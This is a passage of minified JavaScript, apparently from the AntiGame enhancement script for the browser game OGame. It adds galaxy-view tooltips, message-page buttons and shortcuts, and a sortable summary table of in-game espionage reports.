c).append(d),e.is("D20")&&g(".tooltipRel",c).attr("href","javascript:AGO_Data("+h.playerID+",1,2);"),h.playerRank&&e.is("G22")&&(d='<a class="ago_rank" href="'+r.d(g("div.htmlTooltip.galaxyTooltip li.rank a",c).attr("href"))+'"><span class="ago_rank'+r.wrap(" ",h.playerColor)+'">'+(1E4<=h.playerRank?"10&thinsp;k":h.playerRank)+"</span></a>",e.is("G01")?g(c).next().append(d):g(c).append(d))));h.allianceID&&(c=g(".allytag",f),c.length&&((d=m.getTooltip(h.allianceID,h.allianceTag,1))&&g("div.htmlTooltip.galaxyTooltip ul.ListLinks",
c).append(d),h.allianceColor&&g(c).addClass(h.allianceColor),h.allianceRank&&e.is("G32")&&g(c).append('<a class="ago_rank" href="'+h.allianceHighscore+'"><span class="ago_rank'+r.wrap(" ",h.allianceColor)+'">'+h.allianceRank+"/"+h.allianceMember+"</span></a>")))}},getActivityTooltip:function(a){if((a=m.getGalaxy(a))&&a.length){for(var b="",c=0;c<a.length;c++)60>=a[c][2]&&(b+='<li style="white-space: nowrap;">'+A.formatTimestamp(+a[c][0],"[d].[m]&thinsp;/&thinsp;[H]:[i]:[s]")+(15>a[c][2]?" &plusmn15m</li>":
" +"+a[c][2]+"m (+"+a[c][1]+"s)</li>"));return b?'<div class="splitLine"></div>'+b:""}return""},getDebrisTooltip:function(a){return(a=m.getGalaxy(a))&&1E6<a[0]?'<div class="splitLine"></div><li style="white-space: nowrap;">'+A.formatTimestamp(+a[0],"[d].[m]&thinsp;/&thinsp;[H]:[i]:[s]")+" +"+(15>a[2]?"15m</li>":a[2]+"m (+"+a[1]+"s)</li>"):""}},La={Run:function(){La.Show()},Ready:function(){K.disableAutocomplete();K.toggleLargeHeader()},Tooltip:function(){return 1},Show:function(){document.getElementById("allyMemberlist")&&
!g("#allyMemberlist").attr("AntiGame")&&(g("#allyMemberlist").attr("AntiGame","1"),g("#link11.opened, #link12.closed").trigger("click"))},styles:function(){q.setCache(["#netz #alliance #inhalt #eins .contentz .members td { padding: 3px 5px; }"])}},bb={Tooltip:function(){return 0}},cb={Tooltip:function(){return 0}},Ha={Run:function(){Ha.isRun||(Ha.isRun=!0)},Show:function(){Ha.Run()}},Ia={Run:function(){Ia.isRun||(Ia.isRun=!0)},Show:function(){Ia.Run()}},Da={Run:function(){Da.isRun||(Da.isRun=!0)},
Show:function(){Da.Run();Da.isRun&&K.isFirstShow(".searchresults")&&e.is("D20")&&h.addEventAll(".searchresults td.position a","click",Da.showCoords)},showCoords:function(a){a&&a.currentTarget&&(a=n.parseIntAbs(r.getUrlPara("to",g(".action a",a.currentTarget.parentNode.parentNode).attr("href"))))&&m.setStorage("InfoBox_Coords",a)}},W={Run:function(){W.isRun||(W.isRun=!0,m.InitStatus(W.clickTooltip),p.Run(),W.Show())},Ready:function(){K.toggleLargeHeader()},Tooltip:function(a,b,c,d){return w.hasClass(c,
"tooltip")&&"button"===g(a).attr("type")?1:d},Show:function(){if(W.isRun&&K.isFirstShow("#messageContent form[name=delMsg]")){J.log("Ajax - Messages");p.Show();var a=g("#messageContent #mailz").get(0),b=Ma(a);A.isLocal&&(A.changeTime("#mailz tr.entry td.date",document,"[d].[m].[Y] [H]:[i]:[s]"),W.changeTimeSpyreport(a));e.get("M04")&&W.addButtons(b);1<=e.get("M30")&&5>e.get("M30")&&W.foldSpyreports(null,e.get("M30"))}},styles:function(){e.get("M74")&&q.setCache([".combatreport_ididattack_iwon { color: #00B000; }",
".combatreport_ididattack_ilost { color: #D02222; }",".combatreport_ididattack_draw { color: #C0C000; }"]);q.setCache(".anti_msg_buttons td { white-space:nowrap; }");q.setCache(".anti_msg_buttons input { background:transparent url(/cdn/img/layout/formular_buttons.gif) no-repeat scroll -66px -"+(qa?45:44)+"px; background-size: 132px 88px;border:0 none; cursor:pointer !important; font-size:12px; font-weight:700; text-align:center; height: 22px; width: 32px; padding-bottom: "+(la?3:0)+"px; }");q.setCache(".anti_msg_buttons input:hover { background-position: -66px -"+
(qa?67:66)+"px;}");q.setCache([".anti_spy { border: 1px solid #000000; }",".anti_spy_info { display: inline-block; width: 44px; text-align: right; }","#netz .contentz .anti_spy td.key { width: 100px;}","#netz .anti_send_ships { color: "+q.color.textNormal+"; font-size: 11px; text-decoration: none; line-height: 16px; display: inline-block; width: 100%; }","#netz .anti_send_ships:hover { color: "+q.color.textWhite+"; background-color: #32495A; }"]);q.setCache(['.showmessage .note div[style*="1C232C"] { padding: 10px; }']);
if(e.get("M12")){var a={1:{top:3,bot:6},2:{top:2,bot:4},3:{top:1,bot:2},4:{top:0,bot:0}},b=a[e.get("M12")].top,a=a[e.get("M12")].bot;q.setCache(["#netz .contentz #showSpyReportsNow table th.area { padding: 4px 0px;}","#netz #inhalt .contentz td { padding-top: "+b+"px; padding-bottom: "+a+"px; }","#messagebox .spy td { padding-top: "+b+"px; padding-bottom: "+b+"px; }"])}e.is("M51")&&q.setCache(["#spioHelper { text-align:center; margin:0 auto 10px auto; padding:10px 0; width:630px; overflow:auto; }",
"#spioHelper TABLE { border:1px solid #000000; width:98% !important; }","#spioHelper TABLE * { white-space:nowrap !important; }","#spioHelper .header { cursor:default; background-color:#23282D; box-shadow:0 0 3px 1px #00050A inset; }","#spioHelper TH { padding:4px 2px !important; font-weight:bold;  border-bottom:1px solid #000000; border-right:1px solid #000000; text-align:center !important; }","#spioHelper .row { cursor:default; background-color:#14191F; }","#spioHelper .row.even { background-color:#0F141A; }",
"#spioHelper .row:hover { box-shadow:0 0 2px 2px #1278CB; }","#spioHelper TD { padding:4px 2px !important; border-right:1px solid #000000; vertical-align:middle !important; }","#spioHelper TR TH:last-child, #spioHelper TR TD:last-child { border-right:0; }",'#spioHelper .checked { width:18px; text-align:center; background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAG7AAABuwBHnU4NQAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAHmSURBVDiNpZPPaxNBHMXfzG62PxLYFJuc6kKrB0GFZb5stRUkogetnougPagU/QukePbgX+ChePBSBVEaKKIFDypV0XTEGhElqaWQUg8Ntha62XSz42E3bUmsEn3wPczwPu878BimlML/iLdiJiKNiAb/KYCItA6zOnnw+PKM44jh+r3eCnziYvGsma6weLI64TgCudz7B38NICKt0/SymZH5ITNV4QCwj8o6gHtE5PMG8zARde6EE0kvmxkpbsEAoBSwshSvAiiwegv9A/Z151zp1pfX6bnV7x3HAHiJLi978lJxyEx5PAiAoAYEAfBuynK/ye4jUso8U0rh6KA9lrmwcNM69FOrrOvqyfj+j5uutnTmWvG0md6Gaz7w5pHlFmZDGACYEOLKqcvz4332GucawDmwsa4rv6LBTHtMqXBrbRN4ed9yv77dhoGwxulCbs8PzhhiBmC0AV0pn6Usjxnt4TkWA149bIYBgEspS4v5pD19p7fMopBYBBptgG4Azycs9/NMM1x/AaSUpYW5pP34dm+ZcQbDAIz2EH5213LzL34PR5WorRFC9Jy/2rcyucjU1DLU6A1rQwhxeKencVjjZyKingMDqx8Sph+ffdrdv+vmSE0BUcheAKaU8tOf4F0DWtEva5vqYGu9gNgAAAAASUVORK5CYII%3D") center center no-repeat transparent; }',
".SHicon { font-weight:bold; display:block; float:left; width:16px; line-height:16px; text-align:center; margin-right:5px; background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAadEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjEwMPRyoQAAADlJREFUOE9jYLcKYcjrnPefHAzSS7ZmmIWjBsz7PwjCoGnO+v+UYAZKNIP0jhpAjTAAZUlyYwKkFwBL+Kez49LIAgAAAABJRU5ErkJggg%3D%3D) center center no-repeat; }","a.SHicon, a.SHicon:hover { text-decoration:none !important; color:#FFFFFF !important; }",
".textLeft { text-align:left !important; }",".textCenter { text-align:center !important; }",".textRight { text-align:right !important; }",".pointer { cursor:pointer; }","#spioHelper .moon { width:16px; height:16px; margin:0 0 -3px 5px; }","#spioHelper .summary, .SHmaximize, .SHminimize { background-color:#23282D; border:1px solid #000000; box-shadow:0 0 3px 1px #00050A inset; color:#848484; display:inline-block; margin:5px 0 0 6px; padding:3px 7px; float:left; }","#spioHelper .select { background-color: #0F141A; border: 1px solid; width: 200px }",
"#spioHelper .over:hover, .SHdelCloneDiv.over *:hover { box-shadow:0 0 2px 2px #1278CB; }",'.SHmaximize { background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAF2SURBVHjarFMxa8JQEL4nnQISdNbQwSmIi5OBSAJds/ozurZTTTt17s9w1CFLIUHBTBkS/AWJs5jF9fXueM+m4lQNHHfv++7uJXdfhJQSbnkENZh9z2KMvUvu4nx5U7J4WvgPFJ1OJ891XUbLsgTLssS1y5CTyPFhs9nwhdzgeDxCXddM5HlO5k2n06RZvV6vucA0TdA1508Yfg1lv9+HqqpgMplAmqbE+RhzEzxTcaw5nbt73omW7tZutwV6P4oisG2bsJjeioxiwoijHJWrJoNv0HnpsFexhybRwgYWKsxrYOzFXdZ4Dx3AeDxmIMsyHhjaO2KhwsjPabCIJQoD1AG0lA6k3i3GMTVDP9e3UKywWO9f15y3UBSFpGmPRiNYrVY87cYWfMKIoxyVC3+EFAQBGIYBy+WSNYA7/hXSIySoFR851sJgMGDBnWfQ++hJx3EYIIGgUK5JmTgWHD3b7Rb2b3vBDbqv3X/9TIfPg3/zGn8EGADE2Amv4QeLjAAAAABJRU5ErkJggg%3D%3D") no-repeat scroll 2px 2px #23282D; margin-left: 5px; padding: 2px; cursor:pointer; }',
'.SHminimize { background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAFtSURBVHjarFMxa8JQEL6UTgEJuCsdMgVxyRQhkEBXV39LN+0i9a84JkOWwgsEdBIxP0FHwcYla3rf+WJjEAq1geMd993de3ffF6OqKnrkM9Bg8jmZsT9lC9nSX2oCNsX2vnxdzp4QKcty6rouTsUWaL/C2fSBIUf7uJCkQVEUYRzHNBwO4as8zys+6Xw+i8HXMYUc5KIGtc+6AZ4dRlGkPM8j27Zpt9vR/GUubx5EAxqPx2SaJnEONUetG9BoNEoPh4PcuNlsJMa7oRpHDF+n06Fer5euVqufJXbfuvDbdKSnj5M8k3Gll3dDAOOXBg/T+B86uDsC8ywjMH53BMYvS2ROyfd9Y7/fV/1+X9Asy4LF14I0HjAuPucQ5xiM0w0LzK3cYFnWdfNgpO2DXragTaPIExoAz0yTFB2Px2uD7XZLoBk56/Va1Vqolagcx6EkSURhzLXRVqKOhchBLmqaOvjTz8Q6mD1M47cAAwBTLAkUzRxaEAAAAABJRU5ErkJggg%3D%3D") no-repeat scroll 2px 2px #23282D; margin-left: 5px; padding: 2px; cursor:pointer; }'])},
clickTooltip:function(){},addButtons:function(a){function b(a,b,c,d,g,f){return 87>b||89<b||g?(c=e.label(c),g&&(c=c.replace("$subject","'"+g+"'")),'<input type="button" value="'+a+'" style="color: '+(f||"#660011")+';"'+w.getTooltip(c,d)+' name="'+b+'">'):""}var c;c=+s.aktCat;if(0<c&&3!==c&&1!==c&&0<g(".selectContainer").length){c=e.label("M82").replace("$plunder",r.formatNumber(1E3*e.get("M36"))).replace("$debris",r.formatNumber(1E3*e.get("M37")));var d=e.label("M83")+" "+e.get("M05")+(100>e.get("M05")?
" "+e.label("L210"):"");c='<table class="anti_msg_buttons" style="width: 100%; table-layout: fixed;"><tr><td style="width: 6px;"></td><td style="width: 60px;">'+b("V",81,"M81","V","",q.color.textLightGreen)+'</td><td style="width: 71px;">'+b("< S",82,c,"<")+b("< C",83,d,"C")+'</td><td style="width: 71px;">'+b("E",84,"M84","E","","#1B2B55")+b("P",85,"M85","P","",q.color.textBright)+'</td><td style="width: 71px;">'+b("S",86,"M80","S",e.label("M86"),"orange")+b("R",87,"M80","R",e.label("M87"))+'</td><td style="width: 140px;">'+
b("1",88,"M80","1",e.get("M88"))+b("2",89,"M80","2",e.get("M89"))+'<span style="display: inline-block; width: 30px"> </span>'+b("X",90,"M90","DEL")+'</td><td class="anti_msg_arrows" style="width: 30%;"></td><td class="anti_msg_fold" style="width: 30px; text-align: right;">';a=a&&e.is("M30")?'<a href="javascript:void(0);"'+w.getTooltip("M3T")+'><img src="/cdn/img/layout/fleetCloseAll.gif"></a>':"";a=c+a+"</td></tr></table>";g("form[name=delMsg]").before(a).after(a);h.addEventAll(".anti_msg_buttons input",
"click",W.ButtonEvents);h.addEventAll(".anti_msg_fold a","click",W.foldSpyreports);g(".selectContainer").clone(!0).prependTo(".anti_msg_arrows:first").find("div").css("float","left")}},changeTimeCombatreport:function(a){var b,c,d,e;g(".battlereport h3 ~ p.textCenter",a).each(function(){b=r.trim(g(this).html());if(20<b.length&&(c=b.lastIndexOf("("),1<c&&(d=b.substring(c+1).split(")").join(""))&&20>d.length))e=A.convertLocal(d,"[d].[m].[Y] [H]:[i]:[s]"),g(this).html(b.substring(0,c+1)+e+")")})},changeTimeSpyreport:function(a){var b,
c,d,e;g("table.material.spy th.area",a).each(function(){if((b=r.trim(g(this).html()))&&20<b.length)if(c=b.lastIndexOf(" ",b.length-11),(d=b.substring(c+1))&&20>d.length)e=A.convertLocal(d,"[m]-[d] [H]:[i]:[s]"),g(this).html(b.substring(0,c+1)+e)})},foldSpyreports:function(a,b){b||(b=n.d(g("td.anti_msg_fold").attr("status"))+1,5<b&&(b=1));g("td.anti_msg_fold").attr("status",b);g("#section2").attr("ago_display_status",b);g(".anti_msg_fold a img").attr("src","/cdn/img/layout/"+(5===b?"fleetCloseAll.gif":
"fleetOpenAll.gif"));g('#messageContent tr[id^="spioDetails_"]').each(function(){1===b||5>b&&g(this).hasClass("smallplunder")?g(this).hide():g(this).show();var a=g(".fleetdefbuildings.spy",this).eq(2).find("tr:not(:first-child)");2===b||3===b?a.hide():a.show();a=g(".fleetdefbuildings.spy",this).eq(3).find("tr:not(:first-child)");2===b?a.hide():a.show()})},ButtonEvents:function(a){a&&(a.target&&"button"===a.target.type)&&W.HandleButtons(+a.target.getAttribute("name"),a.shiftKey)},Keydown:function(a,
b,c){if(!c){var d=c=b=0;switch(a.keyCode){case 37:b=a.shiftKey?1:2;break;case 39:b=a.shiftKey?4:3;break;case 65:d=1;break;case 81:d=-1;break;case 86:c=81;break;case 46:c=90;break;case 60:c=82;break;case 67:c=83;break;case 69:c=84;break;case 80:c=85;break;case 83:c=86;break;case 82:c=87;break;case 49:c=88;break;case 50:c=89;break;case 70:return W.foldSpyreports(),!1}if(b&&(2===b||3===b||"SELECT"!==document.activeElement.nodeName))return W.HandleArrows(b);if(d)return W.HandleSelect(d);if(c)return W.HandleButtons(c,
a.shiftKey)}return!0},HandleArrows:function(a){var b=document.querySelectorAll(".selectContainer a");return 4<=b.length?(h.click(b[a-1]),!1):!0},HandleSelect:function(a){var b=g("#mailz input.checker");return 0<b.length?(b.attr("checked",1===a?!0:!1),!1):!0},HandleButtons:function(a,b){if(0===g(".anti_msg_buttons").length)return!0;s.Tipped.hideAll();var c=!1;g("#mailz input.checker").each(function(){g(this).attr("checked")&&(c=!0)});var d=[],j;87===a&&(j=e.label("M87"));88===a&&(j=e.get("M88"));89===
a&&(j=e.get("M89"));j=r.trim(j);g("#mailz tr.trigger").each(function(){var f=90===a||j&&0===r.trim(g(this).find("td.subject").text()).indexOf(j)||81===a&&g(this).hasClass("new")||82===a&&g(this).hasClass("smallplunder")||86===a&&0<g(this).find("td.subject span.espionagereport").length||84===a&&0<g(this).find("td.subject a").attr("href").indexOf("&cat=8")||85===a&&0<g(this).find("td.subject a").attr("href").indexOf("&cat=6");if(83===a||84===a){var h=r.trim(g(this).find("td.subject span[class^=combatreport_ididattack_]").text());
if(h){h=r.d(h.split("(")[1]).split(":");if(83===a&&3===h.length&&0===n.parseIntFormat(h[1])){var k=n.parseIntFormat(h[2]),l=e.get("M05");100>l?0===k%1E3&&k<=1E3*l&&(f=!0):k<=l&&(f=!0)}84===a&&1===h.length&&(f=!0)}}b&&g(this).hasClass("new")&&(f=!1);c&&!g("input.checker",this).attr("checked")&&(f=!1);f&&d.push(g(this).attr("id").toString().replace(/\D/g,""))});0<d.length&&s.executeAction(d,81===a?12:7);return!1}},oa={Run:function(){oa.status||(oa.status=4)},Show:function(){oa.Run();var a=g("body > .ui-dialog .showmessage:not([ago_show])"),
b=n.parseIntAbs(g(a).parent().parent().find("span.ui-dialog-title").attr("id")),c=g(".messagebox",a).get(0);4<=oa.status&&(c&&b)&&(g(a).attr("ago_show",b),A.isLocal&&A.changeTime(".infohead tr:last td",c,"[d].[m].[Y] [H]:[i]:[s]"),c.querySelector(".note > .battlereport")?A.isLocal&&W.changeTimeCombatreport(c):c.querySelector(".note > .material.spy")?(Ma(c,b),A.isLocal&&W.changeTimeSpyreport(c)):c.querySelector(".note > .other.newMessage")?oa.addQuoteButton(c,b):c.querySelector(".note > .tooltipHTML.player:first-child")?
(oa.showAlliance(c,b),oa.addQuoteButton(c,b)):c.querySelector(".note > span.tooltip:first-child")&&(a=g(".textWrapper .note",c),a.length&&(b=g("span.tooltip",a).attr("title"))&&g(a).append('<p style="padding: 15px;">'+b+"</p>")))},Keydown:function(a,b,c,d){function e(a,b){var c=(b||document).querySelectorAll('.contentPageNavi a[href*="showmessage"]');2<=c.length&&h.click(c[a])}if(12!==c){if(37===a.keyCode)return e(0,d),!1;if(39===a.keyCode)return e(1,d),!1;if(46===a.keyCode)return h.click(".showMsgNavi .delete a",
d),!1}return!0},addQuoteButton:function(a,b){0<g(".answerHeadline",a).length&&(g("ul.toolbar > li.delete",a).after('<li class="ago_messages_quote"><a class="dark_highlight_tablet ago_messages_quote" title="Quote this message" href="javascript:void(0);" rel="'+b+'"><span class="icon icon_recall float_left"></span><span class="text">quote</span></a></li>'),g("a.ago_messages_quote").click(oa.addQuote))},addQuote:function(){var a=g(this).attr("rel");if(a&&(a=g('body > .ui-dialog .showmessage[ago_show="'+
a+'"]'),a.length)){var b=r.trim(g(".note",a).text()),c=b.indexOf(":"),b="[background color=#1C232C][list]\n[*]"+b.substring(0,c+1)+"[p]\n"+b.substring(c+1)+"\n[/list][/background]";g(".answerForm textarea",a).val(b)}},showAlliance:function(a,b){var c=g(".textWrapper, textWrapperSmall",a);0<c.length&&(g(c).after('<div class="answerHeadline open">     answer        <a href="javascript:void(0);" class="openCloseForm"></a></div><div class="answerForm"><form action="index.php?page=allianceBroadcast" method="post"><input type="hidden" value="200" name="empfaenger"><div class="answerText"><textarea class="mailnew" name="text" tabindex="3"></textarea></div><div class="submit_answer"><span class="count textBeefy">(<span class="cntChars">0</span> / 2000)</span><span class="buttonbox" style="float: right;"><input type="submit" name="submitMail" value="Send" class="btn_blue float_right" tabindex="4"></span><br class="clearfloat"></div></form></div>'),
g("form",a).attr("ago_show",b).submit(function(){g.post(g(this).attr("action"),g(this).serialize()+"&ajax=1");var a=g(this).attr("ago_show");g("span#ui-id-"+a).parent().find("a.ui-dialog-titlebar-close").click();return!1}))}},p={setValue:function(a,b){localStorage[a]=JSON.stringify(b)},getValue:function(a,b){var c=localStorage[a];return!c?b:JSON.parse(c)},Run:function(){if(e.is("M51")&&!qa){p.status=4;var a=g("meta[name=ogame-universe]").attr("content"),b={UNI:a,NAME:"_data_4_4",T1:"sort",T2:"summary of espionage reports",
T3:"coordinates",T4:"age",T5:"player (<span style='color:#99CC00;font-weight:normal;'>activity</span>)",T6:"loot",T7:"DF",T8:"DEF",T9:"jump to spy report",T10:"max. $1 "+g.trim(g("div#countColonies .textCenter").text()).split(" ")[1],T11:g('ul#menuTable a.menubutton[href$="page=galaxy"] .textlabel').text()+": show position $1",T12:"count",T13:"no data",T14:"actions",T15:"check/uncheck all",T16:"invested resources",T17:"points",T18:"check/uncheck report",T20:"add",T21:"save",T22:g('ul#menuTable a.menubutton[href$="page=fleet1"] .textlabel').text(),
T23:g('ul#menuTable a.menubutton[href$="page=defense"] .textlabel').text(),T28:"minimize/maximize table"},c=p.getValue(a+"_data_4_4",{}),b=g.extend({},c,b);p.data=b;if(void 0===p.data.SORT||g.isEmptyObject(p.data.SORT))p.data.SORT={REL:"age",INVERSE:!1},setTimeout(function(){p.setValue(a+"_data_4_4",p.data)},0);p.BEVORZUGT=e.is("FP7")?["A202","A203"]:["A203","A202"];p.data.MINMAX=!1;if(void 0===p.data.CHECKED||!g.isArray(p.data.CHECKED))p.data.CHECKED=[],setTimeout(function(){p.setValue(a+"_data_4_4",
p.data)},0);p.DFPERCENT=e.get("S28")||0.3;p.TECH={A109:[e.label("L109")],A110:[e.label("L110")],A111:[e.label("L111")],A115:[e.label("L115")],A117:[e.label("L117")],A118:[e.label("L118")],A124:[e.label("L124")],A202:[e.label("L202"),2E3,2E3,0,"f",5E3],A203:[e.label("L203"),6E3,6E3,0,"f",25E3],A204:[e.label("L204"),3E3,1E3,0,"f",50],A205:[e.label("L205"),6E3,4E3,0,"f",100],A206:[e.label("L206"),2E4,7E3,2E3,"f",800],A207:[e.label("L207"),45E3,15E3,0,"f",1500],A208:[e.label("L208"),1E4,2E4,1E4,"f",7500],
A209:[e.label("L209"),1E4,6E3,2E3,"f",2E4],A210:[e.label("L210"),0,1E3,0,"f"],A211:[e.label("L211"),5E4,25E3,15E3,"f",500],A212:[e.label("L212"),0,2E3,500,"f"],A213:[e.label("L213"),6E4,5E4,15E3,"f",2E3],A214:[e.label("L214"),5E6,4E6,1E6,"f",1E6],A215:[e.label("L215"),3E4,4E4,15E3,"f",750],A502:[e.label("L502")],A503:[e.label("L503")],A401:[e.label("L401"),2E3,0,0,"d",20],A402:[e.label("L402"),1500,500,0,"d",20],A403:[e.label("L403"),6E3,2E3,0,"d",80],A404:[e.label("L404"),2E4,15E3,2E3,"d",350],A405:[e.label("L405"),
2E3,6E3,0,"d",80],A406:[e.label("L406"),5E4,5E4,3E4,"d",1E3],A407:[e.label("L407"),1E4,1E4,0,"d",200],A408:[e.label("L408"),5E4,5E4,0,"d",1E3]};var d=[].sort;g.fn.sortElements=function(a,b){b=b||function(){return this};var c=this.map(function(){var a=b.call(this),c=a.parentNode,d=c.insertBefore(document.createTextNode(""),a.nextSibling);return function(){if(c===this)throw Error("You can't sort elements if any one is a descendant of another.");c.insertBefore(this,d);c.removeChild(d)}});return d.call(this,
a).each(function(a){c[a].call(b.call(this))})}}},Show:function(){var a,b;if(4<=p.status)if(p.data.LOOT={m:0,k:0,d:0,s:0},p.data.DF={m:0,k:0,s:0},a=g('tr[id^="spioDetails_"]'),0<a.size()){var c=[];a.each(function(){var a=p.parseBericht(g(this));null!==a&&c.push(a)});var d=p.ausgabe(c);g("input#checkAll.checker").click(function(){g(this).is(":checked")?(d.find("th.checkAll").addClass("checked"),d.find("td.checkSingle").addClass("checked"),p.addAllCheck(d)):(d.find("th.checkAll").removeClass("checked"),
d.find("td.checkSingle").removeClass("checked"),p.removeAllCheck(d))});d.find("th.checkAll").addClass("pointer").click(function(){g(this).hasClass("checked")?(g("input#checkAll.checker").attr("checked",!1),g('input[type="checkbox"].checker').not(":first").attr("checked",!1),d.find("th.checkAll").removeClass("checked"),d.find("td.checkSingle").removeClass("checked"),p.removeAllCheck(d)):(g("input#checkAll.checker").attr("checked",!0),g('input[type="checkbox"].checker').not(":first").attr("checked",
!0),d.find("th.checkAll").addClass("checked"),d.find("td.checkSingle").addClass("checked"),p.addAllCheck(d))});g('input[type="checkbox"].checker').not(":first").click(function(){var a=g(this).attr("id");g(this).is(":checked")?(d.find("td."+a).addClass("checked"),p.addCheck(a)):(d.find("td."+a).removeClass("checked"),p.removeCheck(a))});d.find("td.checkSingle").addClass("pointer").click(function(){var a=/([0-9]+)/.exec(g(this).attr("class"))[1];g(this).hasClass("checked")?(g("input#"+a+".checker").attr("checked",
!1),g(this).removeClass("checked"),p.removeCheck(a)):(g("input#"+a+".checker").attr("checked",!0),g(this).addClass("checked"),p.addCheck(a))});g("a.attackIconButton").click(function(){var a=g(this).closest("tr").find("td.checkSingle");if(!a.hasClass("checked")){var b=/([0-9]+)/.exec(a.attr("class"))[1];g("input#"+b+".checker").attr("checked",!0);a.addClass("checked");p.addCheck(b)}});if(0<p.data.CHECKED.length){for(a=0;a<p.data.CHECKED.length;a++){b=p.data.CHECKED[a];var e=g("input#"+b+".checker"),
f=d.find("td."+b);0<e.length&&0<f.length?(g("input#"+b+".checker").attr("checked",!0),d.find("td."+b).addClass("checked")):p.removeCheck(b)}p.data.CHECKED.length===c.length&&(g("input#checkAll.checker").attr("checked",!0),d.find("th.checkAll").addClass("checked"))}var h=p.data.SORT.INVERSE;d.show().find("table th").not('[rel="check"]').not('[rel="actions"]').addClass("pointer").click(function(){d.find("table tr").not(":first").removeClass("even");var a=g(this),b=a.index(),c=a.attr("rel");a.closest("table").find("td").filter(function(){return g(this).index()===
b}).sortElements(function(a,b){a=g(a).text();b=g(b).text();a=a===p.data.T13?0:p.prepareForSorting(c,a);b=b===p.data.T13?0:p.prepareForSorting(c,b);return(isNaN(a)||isNaN(b)?a>b:+a>+b)?h?-1:1:h?1:-1},function(){return this.parentNode});d.find("table tr").not(":first").filter(":even").addClass("even");p.data.SORT.REL=c;p.data.SORT.INVERSE=h;setTimeout(function(){p.setValue(p.data.UNI+p.data.NAME,p.data)},0);h=!h});d.find("table tr").first().find('[rel="'+p.data.SORT.REL+'"]').click();g(".buttonOK.deleteIt").prev();
var k=d.find("table");a=g("<div/>").width(16).height(16).css("float","left").attr("title",p.data.T28).addClass("SHminimize").addClass("over").addClass("tooltip").prependTo(g(".SHdelCloneDiv")).click(function(){k.is(":visible")?(k.hide(),g(this).removeClass("SHminimize").addClass("SHmaximize"),p.data.MINMAX=!0):(k.show(),g(this).removeClass("SHmaximize").addClass("SHminimize"),p.data.MINMAX=!1);setTimeout(function(){p.setValue(p.data.UNI+p.data.NAME,p.data)},0)});p.data.MINMAX&&a.click()}else if(a=
g("#tab-msg li#1").hasClass("aktiv"),b=g("#section2 .mailWrapper a#7"),a&&(0<b.length&&b.hasClass("active")||0===b.length)){if(0<p.data.CHECKED.length)for(a=0;a<p.data.CHECKED.length;a++)b=p.data.CHECKED[a],e=g("input#"+b+".checker"),0===e.length&&p.removeCheck(b);p.data.SORT.REL="age";p.data.SORT.INVERSE=!1;p.data.MINMAX=!1;setTimeout(function(){p.setValue(p.data.UNI+p.data.NAME,p.data)},0)}},parseBericht:function(a){try{var b=/([0-9]+)\.([0-9]+)\.([0-9]+)\s([0-9]+):([0-9]+):([0-9]+)/.exec(g(".OGameClock").html().replace(/<span>/g,
"").replace(/<\/span>/g,"")),c=new Date(b[3],n.parseInt(b[2])-1,b[1],b[4],b[5],b[6]),d={ID:a.attr("id").replace(/spioDetails_/,""),R1:n.parseInt(a.find("table.material table td:eq(1)").html().replace(/\./g,"")),R2:n.parseInt(a.find("table.material table td:eq(3)").html().replace(/\./g,"")),R3:n.parseInt(a.find("table.material table td:eq(5)").html().replace(/\./g,"")),R4:n.parseInt(a.find("table.material table td:eq(7)").html().replace(/\./g,"")),FDB:a.find("table.fleetdefbuildings").length};d.ACTIONS=
g("tr#TR"+d.ID+".entry td.actions a");var f=/\[(\d+:\d+:\d+)\][^\(]*\([^\(\s]+\s+[\']*([^\']+)[\']*\)/.exec(a.find("table.material tr:eq(0) th").html());d.COORDS=f[1];d.SPIELER=f[2];d.SPIELERNAME=(a.find('.material.spy .area span[class*="status_abbr"]').text()||"").trim();f=/([0-9]+):([0-9]+):([0-9]+)/.exec(d.COORDS);d.GALAXY="http://"+p.data.UNI+"/game/index.php?page=galaxy&galaxy="+f[1]+"&system="+f[2]+"&planet="+f[3];var h=/([0-9]+)\.([0-9]+)\.([0-9]+)\s([0-9]+):([0-9]+):([0-9]+)/.exec(a.prev().find("td.date").html());
d.DATE=h[0];var k=new Date(h[3],n.parseInt(h[2])-1,h[1],h[4],h[5],h[6]),l=c.getTime()-k.getTime(),m=Math.floor(l/36E5),q=Math.floor(l/6E4)-60*m,r=Math.floor(l/1E3)-3600*m-60*q;d.AGE="";0<m&&(d.AGE+=m+"h ");0<q&&(d.AGE+=q+"m ");0<r&&(d.AGE+=r+"s");d.FACTOR=0.5;0<=d.SPIELER.indexOf("bandit")?d.FACTOR=1:0<=d.SPIELER.indexOf("honorable")&&(d.FACTOR=0.75);d.ACTIVITY=a.find("table.aktiv font").html();d.ACTIVITY=d.ACTIVITY?' (<span style="color:#99CC00;">'+d.ACTIVITY+"</span>)":"";f=a.find("table.defenseattack tr:eq(1) td.attack a");
